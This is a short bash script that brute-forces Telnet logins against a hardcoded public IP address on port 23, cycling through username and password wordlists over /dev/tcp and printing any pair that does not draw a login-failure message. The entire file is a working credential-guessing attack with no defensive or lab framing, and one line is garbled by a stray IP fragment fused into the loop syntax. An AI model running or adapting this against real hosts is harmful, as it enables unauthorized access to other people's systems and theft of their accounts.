#!/bin/bash

# Configuration
TARGET_IP="147.75.113.113"
TARGET_PORT=23
USER_FILE="/home/arch/Desktop/git/access_scanner/wordlists/usernames.txt"
PASS_FILE="/home/arch/Desktop/git/access_scanner/wordlists/500p.txt"
TIMEOUT=2

# Check if target is alive
if ! ncat -z -w $TIMEOUT "$TARGET_IP" "$TARGET_PORT"; then
    echo "[-] Error: Cannot connect to $TARGET_IP:$TARGET_PORT"
    exit 1
fi

echo "[+] Starting Telnet brute force against $TARGET_IP..."

# Loop through users and passwords
while IFS= read -r username; do
    while IFS= read -r password; do147.75.113.11
        echo "[*] Testing -> User: $username | Pass: $password"

        # Use a subshell to simulate typing the username and password with a delay
        # Adjust sleep times if the remote banner or prompt takes longer to load
        exec 3<>/dev/tcp/$TARGET_IP/$TARGET_PORT

        # Отправляем данные
        sleep 0.5; echo "$username" >&3
        sleep 0.5; echo "$password" >&3
        sleep 0.5

        # Читаем буфер построчно с таймаутом, чтобы избежать зависания
        response=""
        while read -t 1 -u 3 line; do
            response+="$line"$'\n'
        done

        # Закрываем дескриптор
        exec 3>&-
        exec 3<&-

        # Analyze response (Modify 'Login incorrect' based on your target's actual prompt)
        if [[ ! "$response" =~ "Login incorrect" && ! "$response" =~ "Login Failed" ]]; then
            echo -e "\n[+] SUCCESS! Valid Credentials Found:"
            echo "Username: $username"
            echo "Password: $password"
            exit 0
        fi

    done < "$PASS_FILE"
done < "$USER_FILE"

echo "[-] Brute force finished. No valid credentials found."